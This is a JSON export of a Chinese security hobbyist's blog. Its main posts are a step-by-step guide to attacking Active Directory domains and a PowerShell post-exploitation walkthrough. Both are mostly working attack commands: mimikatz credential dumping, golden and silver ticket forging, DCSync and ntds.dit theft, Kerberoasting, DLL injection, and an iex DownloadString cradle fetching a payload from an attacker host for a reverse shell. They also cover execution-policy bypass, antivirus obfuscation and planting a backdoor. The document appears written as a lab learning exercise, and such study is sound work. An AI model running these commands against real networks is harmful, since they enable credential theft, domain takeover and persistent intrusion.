{"meta":{"title":"tkcharlotte's blog","subtitle":null,"description":null,"author":"tk","url":"https://boombao.net","root":"/"},"pages":[{"title":"404 Not Found","date":"2019-07-28T02:20:44.168Z","updated":"2019-07-28T02:20:44.168Z","comments":true,"path":"404.html","permalink":"https://boombao.net/404.html","excerpt":"","text":"404 Not Found **很抱歉，您访问的页面不存在** 可能是输入地址有误或该地址已被删除"},{"title":"关于我","date":"2019-07-28T05:57:42.271Z","updated":"2019-07-28T05:57:42.271Z","comments":true,"path":"about/index.html","permalink":"https://boombao.net/about/index.html","excerpt":"","text":"我 刚踏入社会的新人 练习时长两年多的安全爱好者 坐标： TJ.China 本站 typecho vps + hexo + next主题 github + hexo + material-x主题 …欢迎各位师傅，想要友链的请在评论区留言 : )"},{"title":"所有分类","date":"2019-07-28T02:11:29.375Z","updated":"2019-07-28T02:11:29.375Z","comments":true,"path":"categories/index.html","permalink":"https://boombao.net/categories/index.html","excerpt":"","text":""},{"title":"","date":"2019-07-28T02:12:37.485Z","updated":"2019-07-28T02:12:37.485Z","comments":true,"path":"mylist/index.html","permalink":"https://boombao.net/mylist/index.html","excerpt":"","text":""},{"title":"所有标签","date":"2019-07-28T02:12:10.773Z","updated":"2019-07-28T02:12:10.773Z","comments":true,"path":"tags/index.html","permalink":"https://boombao.net/tags/index.html","excerpt":"","text":""},{"title":"友链","date":"2019-08-24T09:31:38.274Z","updated":"2019-08-24T09:31:38.274Z","comments":true,"path":"friends/index.html","permalink":"https://boombao.net/friends/index.html","excerpt":"","text":""}],"posts":[{"title":"域渗透常用姿势总结","slug":"domain-1","date":"2019-09-23T03:02:40.000Z","updated":"2019-09-24T05:38:27.635Z","comments":true,"path":"2019/09/23/domain-1/","link":"","permalink":"https://boombao.net/2019/09/23/domain-1/","excerpt":"整理完这一套累死…","text":"整理完这一套累死… 前言整理总结一下域渗透中常用的知识和手法，构建知识体系 : ） 感谢klion师傅提供的环境。 感谢各位师傅们的输出(ﾉ*･ω･)ﾉ 参考的文章基本都在参考链接中。 域渗透 — 预备知识何为域域（Domain）是Windows网络中独立运行的单位，域之间相互访问则需要建立信任关系（即Trust Relation）。信任关系是连接在域与域之间的桥梁。当一个域与其他域建立了信任关系后，2个域之间不但可以按需要相互进行管理，还可以跨网分配文件和打印机等设备资源，使不同的域之间实现网络资源的共享与管理。 在 Windows 网络操作系统中，域是安全边界。域管理员只能管理域的内部，除非其他的域显式地赋予他管理权限，他才能够访问或者管理其他的域；每个域都有自己的安全策略，以及它与其他域的安全信任关系。 windows 认证方式NTLM认证本地登录时，用户的密码经过散列算法加密后存储在system32\\config\\sam文件，当用户在登录界面输入密码后，winlogon.exe接收用户输入，然后把密码给lsass.exe，将密码转成NT Hash,然后与文件中已有的散列值比较。 Hash类型LM Hash LM(LAN Manager) Hash 是早期使用的一种hash，在windows vista以后的版本中默认被禁用，使用更加安全的NTLM Hash. NT Hash 现在windows存储使用的hash NTLM Hash NTLM认证过程中使用的hash，是现代windows系统中使用的一种hash，由NT Hash和LM Hash组成。储存在SAM文件中，如果存在域环境，也储存在域控的NTDS.dit文件中，可以直接拿来进行哈希传递攻击。 工作组环境中的认证认证使用NTLM协议，采用Challenge/Response 机制，认证过程可以分为三步： 协商： 确定双方协议版本 质询：Challenge/Response 机制起作用的环节 验证：质询完成后验证结果 质询的主要过程： 客户端向服务端发送用户(用户名)请求 服务端接收请求，生成一个16位的随机数，称为Challenge,使用用户名对应的NTLM Hash加密Challange,生成的值称为Challenge-server,同时将16位随机数发送给客户端。 客户端接收到Chanllenge后，使用想要登录的用户对应的NTLM Hash加密它，该值称为Challenge-client然后发送给服务端。 服务端收到客户端发送的Challenge-client与Challenge-server比较，相等即通过认证。 其实就是双方规定一个字符串，利用散列算法的单向性以及唯一性对同一串字符串加密，生成一串散列值然后比较是否相等,并没有做过多的验证，所以会导致安全问题，最常见的就是pth. 域环境中的认证在域中首先使用的是Kerberos认证，在一些早期版本中或者是前者出错时才会用NTLM认证。 与在工作组中的认证相比，在域中的认证多了个域控，域中的认证过程可以分为以下几步： 客户端获取输入的username password domain信息，传给服务器。 与上面一样，服务端发送16位的随机码给客户端。 客户端使用本地的NTLM Hash对随机码加密，得到的值发送给服务端。 服务端向域控发送验证消息，消息包括客户端申请的用户名 随机码以及传过来的Net NTLM Hash 域控查看该用户对应的NTLM Hash,然后加密随机码，将得到的Net NTLM Hash与客户端的做比较，将结果发给服务端。 服务端根据结果是否相等来返回给客户端不同的结果，验证通过或者是不通过。 可以看到与工作组认证相比，把验证对比的权利交给了域控，服务端只是起一个中间人的角色，负责传话。 pth从工作组认证过程可以看出，并没有对16位的随机字符串Challenge做任何处理，只是采用NTLM Hash对其加密，如果我们可以拿到该用户的NTLM Hash就能伪造一个正确的Challenge-client传给服务端完成认证，如果拿到hash以后无法解密，就可以尝试一下pth. 在一定条件下pth也可以用于远程桌面登录，细节看三好学生师傅文章 ptk上文中提到可以使用pth(pass the hash)来完成对内网的渗透拓展，控制其他主机，微软在12年发布了针对pth的补丁KBb2871997,打了补丁以后常规的攻击无法复现，但是忽略了默认的Administrator(SID 500),只要用户的SID为500，就可以用该账户进行攻击。 在内网禁用了NTLM的环境下也无法进行传递攻击。而mimikatz中的sekurlsa::pth模块可以突破这一点，使用aes key 完成攻击，所以被称为pass-the-key. Kerberos认证Kerberos认证涉及到三方，分别是Client KDC Server，而KDC又分为两部分，分别是AS(Authentication Server)以及TGS(Ticket Granting Server),在该认证过程中靠的是票据，类似于Token一样的一种表明身份的东西。 kerberos认证可以类比坐火车，首先你要通过火车站的安检系统，这样才能进入火车站，进站以后拿到上车的凭证-车票，上车时再核对车票信息，一切都通过后就可以享受火车之旅，同样的，在kerberos认证中Client先与AS交互，得到一个凭证来访问TGS，再与TGS交互，得到访问服务的凭证，最后与服务器交互，完成信息交互。 详细的认证过程如下： 首先是AS与Client交互： Client向AS发送自己的ID 网络地址 等信息，经过Client的hash加密。(KRB_AS_REQ) AS向Client发送两条消息，一条是经过Client密码加密的TGS-Session-Key,用作与TGS交互的密钥. 另一条消息就是TGT,TGT包括TGS-Session-Key以及时间戳等信息，由KRBTGT账户的hash加密，该账户是域创建时自动创建的账号。(KRB_AS_REP) 然后是Client与TGS的交互： Client收到AS返回的信息，解密第一条信息，得到与TGS交互的密钥。然后将本地信息通过密钥加密后连同TGT一起发送给TGS.(KRB_TGS_REQ) TGS接收到消息后会检查是否存在所请求的服务，如果存在就用KRBTGT账户的Hash解密TGT,然后验证相关信息，验证通过后会使用TGS-Session-Key加密Server-Session-Key(Client与Server交互的密钥)，将时间戳 生命周期等信息通过服务的Hash加密后作为Server-Ticket传给Client.(KRB_TGS_REP) 最后是Client与Server的交互： Client获得TGS发回的数据后用TGS-Session-Key解密得到Server-Session-Key,将网络地址 ID等信息通过Server-Session-Key加密，连带Server-Ticket一起发送给Server.(KRB_AP_REQ) Server接收到消息后会用自身Hash解密Server-Ticket，然后验证，验证通过后开始传输数据，走正常的服务请求。(KRB_AP_REP) Golden Ticket(黄金票据)TGT是由KRBTGT用户生成的，有了该票据你可以访问任何通过kerberos认证的服务，如果我们拿到了该用户的Hash，那么我们就可以伪造TGT,该用户只存在于域控中，所以前提是你要拿到域控的权限，有了域控权限干啥不行… Silver Ticket(白银票据)如果我们有服务器上的用户Hash,就可以伪造一个Server-Ticket绕过认证，达到访问服务的目的。白银票据只能访问特定的服务。 MS14-068MS14-068是密钥分发中心（KDC）服务中的Windows漏洞。它允许经过身份验证的用户在其Kerberos票据（TGT）中插入任意PAC（表示所有用户权限的结构）。该漏洞位于kdcsvc.dll域控的KDC中。用户可以通过呈现具有改变的PAC的Kerberos TGT来获得票据。 一句话，可以在拥有一个普通域用户的情况下可以提升为域管理权限。 委派攻击委派分为三种，分别是无约束委派 约束委派以及基于资源的约束委派. 委派简单来说就是模拟客户端，允许服务器用客户端的身份与其他服务交互，比方说在域中有站库分离的web服务，客户端A,http服务器B,mysql服务器C，A想要获得某些数据，就需要B与C交互，这时B扮演的就是客户端的角色，这就是一个委派的例子。 委派的认证过程如下： 客户端与KDC完成KRB_AS_REP KRB_AS_REQ 交互.拿到forwardable TGT. 客户端通过KRB_TGS_REQ 请求转发的TGT,记作forwarded TGT,KDC通过KRB_TGS_REP返回该票据。 客户端使用forwarded TGT通过KRB_TGS_REQ请求Server 1的服务对应的票据，KDC通过KRB_TGS_REP返回票据。 客户端通过KRB_AP_REQ向Server 1发送服务票据 forwardable TGT forwarded TGT以及对应的密钥等信息。 为了满足客户端的需求，Server 1需要用到server2的一些数据，需要server1以用户的身份请求Server 2，在该过程中，server1使用forwarded TGT，以用户的名义通过KRB_TGS_REQ向KDC请求Server 2的服务票据，通过KRB_TGS_REP返回server2的服务票据。 server1 用该票据请求server2，获取数据。 然后重复上述的过程… 当开启无约束委派时，DC会将客户端的TGT的副本放在服务票据中，当客户端向服务器提供服务票据时，服务器会将票据中的用户TGT放入lsass.exe中，在有效期内可以无限制的假冒该用户。如果管理员访问了无约束委派的服务，就能拿到管理员的TGT,模拟域管理访问任意服务，获得管理权限。 为了解决上述问题，微软提出了约束性委派，微软发布了两个kerberos拓展协议，S4U2Proxy和S4U2Self. 无约束委派中直接拿用户的TGT访问服务，在委派服务中，服务AS4UProxy向KDC申请访问服务B的服务票据，然后A使用KDC返回的新票据来访问B。S4USelf协议用来转换非kerberos协议与服务的认证，向服务器申请服务票据，就可以使用S4UProxy协议请求访问其他服务的票据。 有点懵… 先占个坑 https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-sfu/3bff5864-8135-400e-bdd9-33b552051d94 基于资源的约束委派，可以看绿盟博客 Kerberoasting在kerberos认证过程的第四步中，TGS会向Client发送经过服务账户的Hash加密后的服务票据，我们可以拿到这个票据，在本地模拟加密过程对密码进行爆破。如果得到的票据相同，说明得到了服务账户的密码。 服务主体名称(Service Principal Names SPN)是服务器运行服务的唯一标识，每个使用kerberos协议的服务都需要注册一个SPN,SPN分为两种，一种注册在域内机器用户账户(Computer),一种注册在域内用户账户(User)。机器账户一般是默认注册的，如果在域用户下运行服务，必须手动注册SPN,用到setspn.exe。 通过SPN查询，可以挖掘有用的信息，注册在域内用户账户下的SPN, 使用Kerberoast攻击尝试获取密码，也可以找到域中开启相关服务的主机，可以尝试用当前域用户信息登录主机，因为SPN发生在认证过程中，属于正常范围之内，所以比较难检测。 组策略首选项 + SYSVOL (GPP漏洞 –2k08)SYSVOL存在于域中的所有域控中。包含公共文件的共享文件夹，包括组策略数据 ，经过认证的用户都可以访问该文件夹。所有域组策略都存储在这里：\\\\ &lt;DOMAIN&gt; \\ SYSVOL \\ &lt;DOMAIN&gt; \\ Policies \\ 在win2k8中添加了GPP选项，即组策略首选项，可以完成更多的系统及应用管理，比如说管理本地用户 添加计划任务等。 在08的域控上为域主机远程添加用户，所有的操作都会写到Group.xml文件中，包括创建的账户名称 时间 以及加密后的密码。该密码默认是用AES256加密的，而且官方提供了完整的密钥,正好用来解密得到密码。漏洞的补丁编号为KB2962486. 域信任关系域信任关系可以认为是一个域与其他域之间的一种资源访问控制，就像两个国家之间的外交关系，有合作伙伴 也有战略合作伙伴，不同的等级对应的开放程度也不相同。 域信任是有方向的，单向信任以及双向信任。 域信任按传递性可以分为可以传递的(朋友的朋友还是朋友，A-&gt;B B-&gt;C =&gt;A-&gt;C)和非传递性的. 默认信任关系 手动创建的其他信任关系 域和信任关系 域信息收集常用命令12345678910111213ipconfig/all 查看ipnet user 查看本地用户net user /domain 查看域用户net view /domain 查看有几个域net view /domain:domain_name 查看某个域内主机net group /domain 查看域有哪些组net group “domain admins” /domain 查看域管理员组net group “domain controllers” /domain 查看域控net localgroup administrators /domain 查看域管理net timehostname 主机名query user 用户登录信息 判断用户是否在线... 待补充…域渗透 — 实践过程pth拿到了用户的哈希解不开时，可以使用pth mimikatz1234privilege::debug sekurlsa::logonpasswords如果显示不全，采用非交互式可以导出到文件中查看mimikatz.exe &quot;&quot;privilege::debug&quot;&quot; &quot;&quot;sekurlsa::logonpasswords&quot;&quot; exit &gt;&gt; result.txt 123privilege::debugsekurlsa::pth /user:administrator /domain:workgroup /ntlm:ntlm_hash ps：3.144 为域控ip powershellInvoke-WMIExec.ps1 可以执行命令，也可以反弹一个shell,此处加载payload,反弹给cs 12Invoke-WMIExec -Target 192.168.3.144 -Domain workgroup -Username administrator -Hash hash -Command &quot;powershell.exe iex(New-Object Net.WebClient).DownloadString(&apos;http://192.168.3.128/payload.ps1&apos;)&quot; ptt用在kerberos认证中，主要有以下三种.. MS14-068域内用户的sid 域用户的密码 域控位置 MS14-068.exe whoami /all查看用户sid 工具相关参数： 1234-u 域主机名@域名-p 密码-s sid值-d 域控 生成ccache文件 MS14-068.exe -u sqladmin@rootkit.org -p password -s S-1-5-21-3759881954-2993291187-3577547808-1613 -d OWA2013.rootkit.org 使用法国神器导入之前生成的ccache文件，导入之前先清除一下缓存中的票据 黄金票据前提： 域名 sid krbtgt账户的NTLM HASH 伪造用户名 导出krbtgt 的Hash 12privilege::debuglsadump::dcsync /user:krbtgt 生成黄金票据，伪造域用户administrator，注入票据后查看域用户共享 1mimikatz # kerberos::golden /domain:rootkit.org /sid:sid/aes256:ase256 /user:administrator /ticket:admin.kirbi 也可以使用Hash值，不使用key 12lsadump::lsa /patch 导出hashkerberos::golden /domain:rootkit.org /sid:sid /krbtgt:hash /user:administrator /ticket:admin.kirbi 白银票据白银票据不需要与KDC交互，需要服务的Hash，只能面向特定服务。 复现之前记得先清除票据. klist purge 或者在mimikatz中：kerberos:：purge 12mimikatz # kerberos::golden /user:dbadmin /domain:rootkit.org /sid:sid /target:Srv-Web-Kit.rootkit.org /rc4:ntlm_hash /ptt ptk前面的概念中提过一点，打了补丁以后，ptt只能用mimikatz来完成。 获取aes key 12privilege::debugsekurlsa::ekeys 导入key 1mimikatz # sekurlsa::pth /user:administrator /domain:workgroup /aes128:key 要用主机名访问… 在这卡了好一会… kerberoast攻击一般分为SPN发现，请求票据 导出票据 破解票据 重写这几部分。 第一种使用mimikatz的方法 kerberoast 使用工具集中的GetUserSPNs.ps1进行扫描 申请票据 123Add-Type -AssemblyName System.IdentityModelNew-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList &quot;MSSQLSvc/Srv-Web-Kit.rootkit.org:1433&quot; 使用klist会发现票据已经在内存中。 导出票据 kerberos::list /export 爆破票据 使用tgsrepcrack.py爆破 python tgsrepcrack.py dictfile 导出的票据 能不能爆破成功关键还是字典… 第二种 直接提取字节流转换成可以爆破的格式 Invoke-Kerberoast.ps1 Invoke-kerberoast –outputformat hashcat | fl 使用hashcat破解，本地复现的时候提示装一些东西，就没去破解… 重新写入内存(未测试) ./kerberoast.py -p Password1 -r 1-MSSQLSvc~sql01.medin.local~1433-MYDOMAIN.LOCAL.kirbi -w sql.kirbi -u 500 把新的票据重新注入内存 kerberos::ptt sql.kirbi 委派攻击powerview.ps1 无约束委派在域控给服务账户设置无约束委派 选择第二项，无约束委派,如果服务没有注册SPN,先使用setspn.exe注册一下。 假设我们拿到了域内一台服务的权限 使用PowerView.ps1脚本查看开启无约束委派的服务 12Get-NetUser -Unconstrained -Domain rootkit.orgGet-NetComputer -Unconstrained -Domain rootkit.org 提取受控主机内存中保存的票据，进行ptt攻击。 12privilege::debugsekurlsa::tickets /export //导出票据 可以看到有域管理的凭证， 注入该凭证。 然后访问域控。 约束委派 在开启约束委派的主机上无法抓到用户的TGT,只能抓到服务票据，所以只能访问特定的服务。 如果知道服务账户的的明文密码或者哈希值，就可以拿到域管理权限。 kekeo 查看约束委派是否存在 12Get-DomainUser -TrustedToAuth -Domain rootkit.org //账户Get-NetComputer -Unconstrained -Domain rootkit.org //主机 生成tgt 1tgt::ask /user:sqladmin /domain:rootkit.org /password:Admin12345 申请tgs票据 12tgs::s4u:TGT_sqladmin@ROOTKIT.ORG_krbtgt~rootkit.org@ROOTKIT.ORG.kirbi /user:administrator@rootkit.org /service:cifs/OWA2013.rootkit.org 导入tgs票据 dir访问域控共享目录 keoeo也支持直接使用哈希获取tgt 1tgt::ask /user:sqladmin /domain:rootkit.org /NTLM:hashvalue 这样我们只要拿到服务的权限，就能提取出凭证进行攻击。 基于资源的约束委派看绿盟那篇博客吧… 哈希导出可以使用procdump.exe导出lsass.exe中的内存映像，离线抓密码 procdump64.exe -accepteula -ma lsass.exe lsass.dmp mimikatz::sekurlsa:minidump lsass.dmp mimikatz::sekurlsa:logonpasswords DCsyncmimikatzlsadump::dcsync /domain:rootkit.org /all /csv 利用dcsync(目录复制服务)获取ntds.dit中的密码哈希。 可以在域管理范围之内的任意一台主机运行。 多加一个/user name 参数，可以指定用户导出 也可以直接在域控上导出lsass.exe进程中的哈希。 12privilege::debuglsadump::lsa /inject powershellInvoke-DCSync.ps1 Empirecredentials/mimikatz/dcsync_hashdump NTDS.DIT/Volume Shadow Copy ServiceNTDS.DIT文件保存了域中所有用户的密码和哈希值。 ntdsutil默认安装 查询快照 12ntdsutil snapshot &quot;List All&quot; quit quitntdsutil snapshot &quot;List Mounted&quot; quit quit 创建快照 ntdsutil snapshot &quot;activate instance ntds&quot; create quit quit 挂载快照 ntdsutil snapshot &quot;mount {2931cb68-5c88-4f27-ac6d-abcb738bfee7}&quot; quit quit 复制 copy C:\\$SNAP_201909221525_VOLUMEC$\\windows\\NTDS\\ntds.dit c:\\ntds.dit 一定要在cmd中运行… 一开始在ps中运行，老是找不到路径… 卸载快照 清理痕迹 ntdsutil snapshot &quot;unmount {2931cb68-5c88-4f27-ac6d-abcb738bfee7}&quot; quit quit vssadmin默认安装 查询系统快照 vssadmin list shadows 创建快照 vssadmin create shadow /for=c: 复制文件 copy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy3\\windows\\NTDS\\ntds.dit c:\\ntds.dit 删除快照 vssadmin delete shadows /for=c: /quiet vshadow不自带，直接使用.bat版 123456789101112131415161718setlocalif NOT &quot;%CALLBACK_SCRIPT%&quot;==&quot;&quot; goto :IS_CALLBACKset SOURCE_DRIVE_LETTER=%SystemDrive%set SOURCE_RELATIVE_PATH=\\windows\\ntds\\ntds.ditset DESTINATION_PATH=%~dp0@echo ...Determine the scripts to be executed/generated...set CALLBACK_SCRIPT=%~dpnx0set TEMP_GENERATED_SCRIPT=GeneratedVarsTempScript.cmd@echo ...Creating the shadow copy...&quot;%~dp0vshadow.exe&quot; -script=%TEMP_GENERATED_SCRIPT% -exec=&quot;%CALLBACK_SCRIPT%&quot; %SOURCE_DRIVE_LETTER%del /f %TEMP_GENERATED_SCRIPT%@goto :EOF:IS_CALLBACKsetlocal@echo ...Obtaining the shadow copy device name...call %TEMP_GENERATED_SCRIPT%@echo ...Copying from the shadow copy to the destination path...copy &quot;%SHADOW_DEVICE_1%\\%SOURCE_RELATIVE_PATH%&quot; %DESTINATION_PATH% 上传.bat和exe文件到当前目录，可以下载源码编译，想偷懒也可以直接戳这里 不保证安全性。 运行脚本，会自动执行整个流程。 导出之前还需要用esentutl修复一下 esentutl /p /o ntds.dit 导出syskey reg save hklm\\system system.hive ….从NTDS.DIT中提取哈希得到ntds.dit文件以后，直接在线导出哈希 1QuarksPwDump.exe --dump-hash-domain --with-history --ntds-file ntds.dit --system-file system.hive -o pass.txt quarkspwdump.exe 123456789101112quarks-pwdump.exe &lt;options&gt;Options :-dhl --dump-hash-local-dhdc --dump-hash-domain-cached-dhd --dump-hash-domain (NTDS_FILE must be specified)-db --dump-bitlocker (NTDS_FILE must be specified)-nt --ntds-file FILE-hist --with-history (optional)-t --output-type JOHN/LC (optional, if no=&gt;JOHN)-o --output FILE (optional, if no=&gt;stdout)Example: quarks-pwdump.exe --dump-hash-domain --with-history 也可以用Invoke-NinjaCopy.ps1 注册表导出哈希涉及到三个注册表项，分别是HKEY_LOCAL_MACHINE\\SAM HKEY_LOCAL_MACHINE\\SECURITY HKEY_LOCAL_MACHINE\\SYSTEM HKEY_LOCAL_MACHINE\\SAM包含本地用户凭证 HKEY_LOCAL_MACHINE\\SECURITY中缓存了域用户的凭证 HKEY_LOCAL_MACHINE\\SYSTEM中可以提取出syskey，进而解密哈希 123reg.exe save hklm\\sam c:\\sam.savereg.exe save hklm\\security c:\\security.savereg.exe save hklm\\system c:\\system.save 使用impacket套件中的secretsdump.py解密 python secretsdump.py -sam ../../sam.save -security ../../security.save -system ../../system.save LOCAL 也可以用cain. 其他工具千千万，重要的还是思路吧 : ） 参考资料深刻理解windows安全认证机制 ntlm &amp; Kerberos 彻底理解Windows认证 – 议题解读 http://drops.xmd5.com/static/drops/tips-11631.html LM, NTLM, Net-NTLMv2, oh my! https://github.com/crazywa1ker/DarthSidious-Chinese https://sakuxa.com/2019/04/03/01-Windows认证之NTLM/ windows认证-白银票据、黄金票据分析及利用 域渗透——Kerberoasting 我所了解的内网渗透——内网渗透知识大总结 https://www.freebuf.com/articles/system/6089.html Kerberos协议探索系列之委派篇 攻击活动目录：无约束委派及域林信任 S4U2Pwnage http://blog.nsfocus.net/analysis-attacks-entitlement-resource-constrained-delegation/ Attacking Kerberos Delegation 域密码哈希导出的那些事儿 渗透测试中心 域渗透-获得域控服务器的NTDS.dit文件 导出当前域内所有用户hash的技术整理","categories":[{"name":"安全","slug":"安全","permalink":"https://boombao.net/categories/安全/"}],"tags":[{"name":"域渗透","slug":"域渗透","permalink":"https://boombao.net/tags/域渗透/"}]},{"title":"数据转发姿势(不定期更新...)","slug":"data-forward","date":"2019-09-18T04:42:19.000Z","updated":"2019-09-18T04:50:12.920Z","comments":true,"path":"2019/09/18/data-forward/","link":"","permalink":"https://boombao.net/2019/09/18/data-forward/","excerpt":"记录数据转发的各类姿势手法。","text":"记录数据转发的各类姿势手法。 SSH 端口转发动态端口转发(SOCKS代理)让不加密的连接走SSH连接，提高数据安全性。 SSH -D port user@host SSH会建立一个socket连接，监听转发的端口。经过该端口的数据会被转发到远程主机。 场景A B C三台主机，A在网段A，B在网段B，不能互相ping通，但是C有两张网卡可以沟通A和B，我们可以在C上使用动态端口转发，然后A挂上C的socks代理就能访问B。 本地端口转发ssh -L local_port ssh_ip ssh_port server 场景 host1和host2不能直接访问，但是可以通过host2中继一下。 ssh -L 2121:host2:21 host3 host1绑定本地2121端口，当有到2121端口连接时转发到host3,由host3连接到host2的21端口。此时host1作为一个服务端。 host1本地执行ssh -p 2121 localhost 连接到本地2121端口，实际连接的是host2的22端口。 远程端口转发(内网穿透)ssh -R port:&lt;host2&gt;:host2_port host3 让远程主机host3监听端口port,本地主机与host建立连接。将内网host2端口转发到外网host3的port端口。 场景 外网不能访问内网，内网之间可以访问。 在host1上，ssh -R 2222:host2:22 host3,意思就是让host3监听2222端口，然后把数据经过host1转发给host2 在host3上，ssh -p 2222 localhost 实际连接的是host2。 如果host1和host2是同一台主机，就更好理解了，典型的内网穿透的场景，内网能访问外网，但是外网不能访问内网。 参考链接 https://cherrot.com/tech/2017/01/08/ssh-tunneling-practice.html","categories":[{"name":"内网渗透","slug":"内网渗透","permalink":"https://boombao.net/categories/内网渗透/"}],"tags":[{"name":"内网","slug":"内网","permalink":"https://boombao.net/tags/内网/"},{"name":"安全","slug":"安全","permalink":"https://boombao.net/tags/安全/"}]},{"title":"powershell初体验","slug":"powershell","date":"2019-09-17T03:03:34.000Z","updated":"2019-09-18T04:37:00.215Z","comments":true,"path":"2019/09/17/powershell/","link":"","permalink":"https://boombao.net/2019/09/17/powershell/","excerpt":"菜鸡的自我救赎之路 :）","text":"菜鸡的自我救赎之路 :） 0x01 预备知识基本规则&amp;查看帮助PowerShell的每个命令都遵循谓词-名词的标准，例如GET-Process. -为标准参数分隔符，每个参数前面始终带- 例Get-Command -Name Clear-Host Get-Command -Name 命令名 可以查看该命令的用法 Get-Command 获取帮助 命令后跟上-? 可查看详细的用法说明 例Get-Command -? PowerShell中也支持一些常见的cmd命令或者是shell命令。 常用操作 Get-Host 查看版本信息 Clear-Host 清空输出窗口 New-Item 1.txt -type file [-force] -force将覆盖原有的同名文件。 Get-Content 获取文件内容，直接输出到控制台上。 Out-File 重定向，写文件(类似于linux中的&gt;) ，常配合管道使用 例，将当前正在运行进程名写入到`process.txt` Write-Output 配合管道使用，为最后一个命令时输出到控制台中。 下载文件到本地 使用.NET中提供的System.Net.WebClient类 12345678$url = &quot;http://127.0.0.1/1.exe&quot;$end_flag = &quot;download finish!&quot;$local_file = &quot;rec.exe&quot;Write-Output &quot;start to download&quot;#public void DownloadFile (Uri address, string fileName); filename: local file to receive remote file(New-Object System.Net.WebClient).DownloadFile($url,$local_file)Write-Output $end_flag Invike-Exppession 把字符串当作命令执行，返回执行结果。IEX是它的别名。 12$command = &apos;Get-Process&apos;IEX($command)|Write-Output ![](https://boombao.oss-cn-beijing.aliyuncs.com/20190911173727.png)执行策略对脚本运行做的一种限制措施，在不同的场景中采取不同的策略来防止执行恶意代码。 由六种执行策略，分别是RESTRICTED ALLSIGNED REMOTESIGNED UNRESTRICTED BYPASS UNDEFINED，默认情况下为RESTRICTED RESTRICTED 默认执行策略 阻止所有脚本运行 Windows 8、Windows Server 2012 和 Windows 8.1 中的默认执行策略 ALLSIGNED 可以运行由受信任机构发布的签名的脚本 Set-AuthenticodeSignature 命令可以给脚本签名，以本地PFX文件签名为例,详细的签名过程可以戳这里 12$cert = Get-PfxCertificate -FilePath C:\\Test\\Mysign.pfxSet-AuthenticodeSignature -FilePath ServerProps.ps1 -Certificate $cert REMOTESIGNED server 2012 R2默认策略 远程加载脚本时仍需要签名，本地不需要。 有一定的安全风险。 UNRESTRICTED 未签名的脚本可以运行 远程加载脚本时会有安全提示。 BYPASS 没有任何限制与提示。 UNDEFINED 没有设置安全策略，此时会使用默认安全策略。 查看当前执行策略 Get-ExecutionPolicy 查看当前用户执行策略 Get-ExecutionPolicy -Scope CurrentUser 使用Set-ExecutionPolicy -ExecutionPolicy PolicyName改变执行策略。 修改完毕后有时候会提示你未修改成功，因为有更细化的执行策略，所以保留当前策略，可以使用Get-ExecutionPolicy -List 查看优先级。 绕过执行策略执行脚本 powershell.exe -ExecutionPolicy Bypass -File ..\\demo.ps1 powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -NoLogo -File ..\\demo.ps1 远程下载文件到服务器上运行 powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -NoLogo -NoProfile -File ..\\demo.ps1 ….. 0x02最简单的场景假设我们现在拿到一个webshell，要反弹一个shell回来，直接使用PowerShell加载shellcode，在终端中下载并运行该脚本，metasploit能够接收到反弹回来的shell。 ps: 本文尽量使用powershell作为攻击手段 (主角光环 powershell -nop -c &quot;iex(New-Object Net.WebClient).DownloadString(&#39;http://192.168.30.166:8000/payload.ps1&#39;)&quot; 得到一个meterpreter后加载powershell插件，进入powershell界面。 测试的时候发现通过该方式得到的meterpreter很不稳定，经常崩溃导致shell丢失，所以要重新获得一个shell. 使用dll注入的方式得到一个shell,msfvenom生成dll,同时监听相应端口接收反弹回来的shell 12345678910111213PS &gt; IEX (New-Object Net.WebClient).DownloadString(&apos;http://192.168.30.166/CodeExecution/Invoke-DllInjection.ps1&apos;)PS &gt; start-process c:\\windows\\system32\\notepad.exe -Windowstyle HiddenPS &gt; get-process notepadHandles NPM(K) PM(K) WS(K) VM(M) CPU(s) Id ProcessName- 86 9 1864 6280 79 0.11 10200 notepadPS &gt; Invoke-DllInjection -ProcessID 10200 -dll C:\\Users\\admin\\Desktop\\paylod.dll Size(K) ModuleName FileName ------- ---------- -------- 20 paylod.dll C:\\Users\\admin\\Desktop\\paylod.dll 尝试提权，使用增强版的Invoke-ReflectivePEInjection.ps1，可以远程加载exe在内存中运行，做到攻击不落地,实际中尝试多次均失败… 使用msf自带的exploit-suggester检测一下系统存在的提权漏洞 123456789101112msf5 post(multi/recon/local_exploit_suggester) &gt; show optionsModule options (post/multi/recon/local_exploit_suggester): Name Current Setting Required Description ---- --------------- -------- ----------- SESSION yes The session to run this module on SHOWDESCRIPTION false yes Displays a detailed description for the available exploitsmsf5 post(multi/recon/local_exploit_suggester) &gt; set session 2session =&gt; 2msf5 post(multi/recon/local_exploit_suggester) &gt; exploit 我本地虚拟机没打补丁，所以存在很多漏洞… 也可以用Sherlock.ps1 ,powershell实现的相同功能的脚本，后者更加详细准确一些。 地址：https://github.com/rasta-mouse/Sherlock/blob/master/Sherlock.ps1 使用MS16-135提权 脚本地址https://github.com/FuzzySecurity/PSKernel-Primitives/tree/master/Sample-Exploits/MS16-135 有了权限，下一步抓取hash，使用Invoke-Mimikatz.ps1 进一步信息收集，上lazagne https://github.com/AlessandroZ/LaZagne,查看可能存在的密码啥的。 扫描一下内网存活主机以及开放端口 使用Invoke-Portscan.ps1，扫描速度与精度还算可以吧，还是稍微有点误差.. IEX (New-Object Net.WebClient).DownloadString(&#39;http://192.168.30.166/Recon/Invoke-Portscan.ps1&#39;) Invoke-Portscan -Hosts 192.168.30.0/24 -T 4 -Ports &quot;21,22,23,80,1433,1521,3306,3389&quot; | out-file port_result.txt cat port_result.txt 可以发现其他存活主机，然后继续横向渗透，因为本地并没有域环境，本次就到此为止，后续域渗透时再补上powershell在域渗透中的应用。 最后留个后门，清理下痕迹走人。https://github.com/re4lity/Schtasks-Backdoor 随着powershell在渗透测试中使用的越来越频繁，相关的防护软件都注意到这一点，所以需要做一些混淆来绕过杀软。 推荐danielbohannon大佬写的混淆框架：https://github.com/danielbohannon/Invoke-Obfuscation 还有作者写的使用教程：https://www.danielbohannon.com/blog-1/2017/12/2/the-invoke-obfuscation-usage-guide 也可以直接使用Empire后渗透框架来完成渗透流程。 0x03 姿势&amp;工具 https://github.com/PowerShellMafia/PowerSploit https://github.com/FuzzySecurity/PowerShell-Suite https://github.com/danielbohannon/Invoke-Obfuscation 